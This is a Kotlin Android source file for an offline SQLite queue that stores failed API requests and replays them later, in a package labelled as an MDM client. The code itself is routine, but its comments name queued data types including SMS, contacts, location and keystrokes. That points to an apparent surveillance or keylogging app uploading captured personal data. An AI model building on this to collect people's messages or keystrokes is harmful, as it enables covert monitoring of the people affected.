package com.mdm.client.network

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Log

/**
 * SQLite-backed queue for API payloads that couldn't be delivered due to
 * network outage. Data is stored locally and automatically synced when
 * connectivity returns.
 *
 * Each entry stores the HTTP method, API path, and JSON body so the exact
 * request can be replayed later.
 *
 * Entries are capped at [MAX_QUEUE_SIZE] to prevent unbounded storage growth.
 * Oldest entries are evicted when the cap is reached.
 * Failed entries are retried up to [MAX_RETRIES] before being discarded.
 */
class OfflineDataQueue(context: Context) :
    SQLiteOpenHelper(context, DB_NAME, null, DB_VERSION) {

    companion object {
        private const val TAG = "OfflineQ"
        private const val DB_NAME = "offline_data_queue.db"
        private const val DB_VERSION = 1
        private const val TABLE = "queued_requests"
        private const val MAX_QUEUE_SIZE = 500
        private const val MAX_RETRIES = 5
    }

    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL("""
            CREATE TABLE $TABLE (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_path TEXT NOT NULL,
                http_method TEXT NOT NULL DEFAULT 'POST',
                json_body TEXT NOT NULL,
                data_type TEXT DEFAULT 'unknown',
                created_at INTEGER NOT NULL,
                retry_count INTEGER DEFAULT 0,
                last_retry_at INTEGER DEFAULT 0
            )
        """)
        db.execSQL("CREATE INDEX idx_created ON $TABLE(created_at ASC)")
        db.execSQL("CREATE INDEX idx_data_type ON $TABLE(data_type)")
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        db.execSQL("DROP TABLE IF EXISTS $TABLE")
        onCreate(db)
    }

    // ── Enqueue ──────────────────────────────────────────────────────────────

    /**
     * Store a failed API request for later delivery.
     * @param path     The API endpoint path (e.g. "/location")
     * @param body     The JSON body as a string
     * @param dataType Category label for logging/prioritisation
     *                 (e.g. "location", "sms", "contacts", "keystrokes")
     * @param method   HTTP method, defaults to "POST"
     */
    fun enqueue(
        path: String,
        body: String,
        dataType: String = "unknown",
        method: String = "POST"
    ) {
        try {
            enforceSizeLimit()

            val values = ContentValues().apply {
                put("api_path", path)
                put("http_method", method)
                put("json_body", body)
                put("data_type", dataType)
                put("created_at", System.currentTimeMillis())
            }
            val id = writableDatabase.insert(TABLE, null, values)
            Log.i(TAG, "Queued offline payload: $dataType → $path (id=$id, queue=${count()})")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enqueue: ${e.message}")
        }
    }

    // ── Dequeue ──────────────────────────────────────────────────────────────

    data class QueuedRequest(
        val id: Long,
        val path: String,
        val method: String,
        val body: String,
        val dataType: String,
        val createdAt: Long,
        val retryCount: Int
    )

    /**
     * Fetch all queued requests in FIFO order, limited to [limit].
     * Does NOT remove them — call [remove] after successful delivery.
     */
    fun peekBatch(limit: Int = 50): List<QueuedRequest> {
        val requests = mutableListOf<QueuedRequest>()
        try {
            val cursor = readableDatabase.query(
                TABLE, null,
                "retry_count < ?", arrayOf(MAX_RETRIES.toString()),
                null, null,
                "created_at ASC",
                limit.toString()
            )
            cursor.use {
                while (it.moveToNext()) {
                    requests.add(
                        QueuedRequest(
                            id = it.getLong(it.getColumnIndexOrThrow("id")),
                            path = it.getString(it.getColumnIndexOrThrow("api_path")),
                            method = it.getString(it.getColumnIndexOrThrow("http_method")),
                            body = it.getString(it.getColumnIndexOrThrow("json_body")),
                            dataType = it.getString(it.getColumnIndexOrThrow("data_type")),
                            createdAt = it.getLong(it.getColumnIndexOrThrow("created_at")),
                            retryCount = it.getInt(it.getColumnIndexOrThrow("retry_count"))
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to peek queue: ${e.message}")
        }
        return requests
    }

    /**
     * Remove a successfully delivered request from the queue.
     */
    fun remove(queueId: Long) {
        try {
            writableDatabase.delete(TABLE, "id = ?", arrayOf(queueId.toString()))
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove: ${e.message}")
        }
    }

    /**
     * Mark a failed retry — increments count and records timestamp.
     */
    fun markRetry(queueId: Long) {
        try {
            writableDatabase.execSQL(
                "UPDATE $TABLE SET retry_count = retry_count + 1, last_retry_at = ? WHERE id = ?",
                arrayOf(System.currentTimeMillis(), queueId)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to mark retry: ${e.message}")
        }
    }

    // ── Maintenance ──────────────────────────────────────────────────────────

    /**
     * Remove entries that have exceeded max retries.
     */
    fun purgeExpired() {
        try {
            val deleted = writableDatabase.delete(
                TABLE,
                "retry_count >= ?",
                arrayOf(MAX_RETRIES.toString())
            )
            if (deleted > 0) {
                Log.i(TAG, "Purged $deleted expired entries")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Purge failed: ${e.message}")
        }
    }

    /**
     * Remove oldest entries if queue exceeds max size.
     */
    private fun enforceSizeLimit() {
        try {
            val currentSize = count()
            if (currentSize >= MAX_QUEUE_SIZE) {
                val excess = currentSize - MAX_QUEUE_SIZE + 50 // Remove 50 extra for headroom
                writableDatabase.execSQL(
                    "DELETE FROM $TABLE WHERE id IN (SELECT id FROM $TABLE ORDER BY created_at ASC LIMIT ?)",
                    arrayOf(excess)
                )
                Log.w(TAG, "Queue overflow — evicted $excess oldest entries")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Size limit enforcement failed: ${e.message}")
        }
    }

    /**
     * Total number of queued requests.
     */
    fun count(): Int {
        return try {
            val cursor = readableDatabase.rawQuery("SELECT COUNT(*) FROM $TABLE", null)
            cursor.use {
                if (it.moveToFirst()) it.getInt(0) else 0
            }
        } catch (e: Exception) { 0 }
    }

    /**
     * Breakdown by data type for diagnostics.
     */
    fun countByType(): Map<String, Int> {
        val counts = mutableMapOf<String, Int>()
        try {
            val cursor = readableDatabase.rawQuery(
                "SELECT data_type, COUNT(*) FROM $TABLE GROUP BY data_type", null
            )
            cursor.use {
                while (it.moveToNext()) {
                    counts[it.getString(0)] = it.getInt(1)
                }
            }
        } catch (_: Exception) {}
        return counts
    }

    /**
     * Clear all queued data.
     */
    fun clear() {
        try {
            writableDatabase.delete(TABLE, null, null)
            Log.i(TAG, "Queue cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Clear failed: ${e.message}")
        }
    }
}
